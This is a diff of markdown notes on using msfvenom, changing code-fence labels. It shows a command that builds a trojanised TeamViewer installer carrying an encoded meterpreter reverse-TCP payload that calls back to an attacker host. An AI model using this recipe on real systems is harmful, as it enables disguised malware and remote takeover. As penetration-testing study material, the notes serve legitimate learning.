@@ -34,7 +34,7 @@ linux/zarch/meterpreter_reverse_tcp
 ## Usage
 
 ### List all payloads
-```sh
+```bash
 msfvenon -l payloads
 # Payloads will commonly be named with their OS first eg. windows/dllinject/bind_tcp
 ```
@@ -56,7 +56,7 @@ We could then deliver this to our target system, common ways include:
 
 ### Building a backdoor'ed executable
 You can build a payload into an existing executable by using the `-k` flag. This will embed the payload into the executable and when run, will create a separate thread from the main application that is running our backdoor.
-```sh
+```bash
 # This command embeds the meterpreter stageless payload into the provided TeamViewer_Setup.exe.
 # It also encodes the payload using the shikata_ga_nai algo with 5 iterations.
 msfvenom window/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -i 5 -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe
